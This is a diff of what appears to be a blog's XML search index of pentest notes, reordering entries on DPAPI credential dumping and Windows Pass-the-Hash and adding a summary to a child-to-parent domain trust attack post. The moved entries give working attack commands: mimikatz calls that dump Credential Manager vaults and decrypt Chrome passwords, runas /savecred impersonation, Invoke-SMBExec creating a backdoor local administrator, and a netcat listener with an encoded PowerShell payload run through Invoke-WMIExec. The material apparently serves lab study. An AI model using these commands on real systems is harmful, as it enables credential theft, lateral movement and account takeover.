@@ -205,7 +205,10 @@
   <entry>
     <title>Attacking Child-Parent Trust From Linux</title>
     <url>/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/</url>
-    <content><![CDATA[<h1 id="Manually"><a href="#Manually" class="headerlink" title="Manually"></a>Manually</h1><h3 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h3><p>To successfully get access to the parent domain we need first : </p>
+    <content><![CDATA[<blockquote>
+<p>Attacking Domain Trusts – Child → Parent Trusts relies on manipulating the SID History attribute to add a high-privilege group SID, allowing an attacker in the child domain to escalate privileges and access the parent domain as SYSTEM.</p>
+</blockquote>
+<h1 id="Manually"><a href="#Manually" class="headerlink" title="Manually"></a>Manually</h1><h3 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h3><p>To successfully get access to the parent domain we need first : </p>
 <blockquote>
 <p>The KRBTGT hash of the child domain ( To Sign the Golden Ticket )<br>The SID of the child domain<br>The FQDN of the child domain.<br>The name of a target user in the child domain (doesn’t need to exist!)<br>The SID of the Enterprise Admins Group of the parent domain.</p>
 </blockquote>
@@ -282,6 +285,59 @@
       </tags>
   </entry>
   <entry>
+    <title>DPAPI</title>
+    <url>/2025/11/26/DPAPI/</url>
+    <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
+<ul>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
+<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
+<li><code>%ProgramData%\Microsoft\Vault\</code></li>
+<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
+</ul>
+<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
+<li>Website passwords.</li>
+<li>Online account logins</li>
+</ul>
+<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
+<li>Network shares (like <code>\\server\share</code>)</li>
+<li>Domain user logins</li>
+<li>Services (OneDrive, etc.)</li>
+<li>Remote desktop connections</li>
+</ul>
+<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
+<p>For standard vaults </p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	</span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
+
+<p>For stored credentials</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list </span><br><span class="line"></span><br><span class="line">Currently stored credentials: </span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt </span><br><span class="line">Local machine persistence </span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
+
+
+<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
+<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
+<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
+<p>➜ This will create a new <code>powershell</code> process.</p>
+<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-DPAPI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Dump Lsass</title>
     <url>/2025/11/26/Dump-Lsass/</url>
     <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
@@ -342,59 +398,6 @@
       </categories>
       <tags>
         <tag>Dump-NTDS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DPAPI</title>
-    <url>/2025/11/26/DPAPI/</url>
-    <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
-<ul>
-<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
-<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
-<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
-<li><code>%ProgramData%\Microsoft\Vault\</code></li>
-<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
-</ul>
-<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
-<li>Website passwords.</li>
-<li>Online account logins</li>
-</ul>
-<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
-<li>Network shares (like <code>\\server\share</code>)</li>
-<li>Domain user logins</li>
-<li>Services (OneDrive, etc.)</li>
-<li>Remote desktop connections</li>
-</ul>
-<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
-<p>For standard vaults </p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	</span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
-
-<p>For stored credentials</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list </span><br><span class="line"></span><br><span class="line">Currently stored credentials: </span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt </span><br><span class="line">Local machine persistence </span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
-
-
-<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
-<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
-<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
-<p>➜ This will create a new <code>powershell</code> process.</p>
-<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
-<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-DPAPI</tag>
       </tags>
   </entry>
   <entry>
@@ -984,35 +987,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
-    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
-<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
-<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>mimikatz</tag>
-        <tag>Invoke-TheHash</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows Credential Hunting</title>
     <url>/2025/11/26/Windows-Credential-Hunting/</url>
     <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
@@ -1058,6 +1032,35 @@
       <tags>
         <tag>Lazagne</tag>
         <tag>Search-for-File-Content</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
+<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
+<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
+      </categories>
+      <tags>
+        <tag>mimikatz</tag>
+        <tag>Invoke-TheHash</tag>
       </tags>
   </entry>
   <entry>
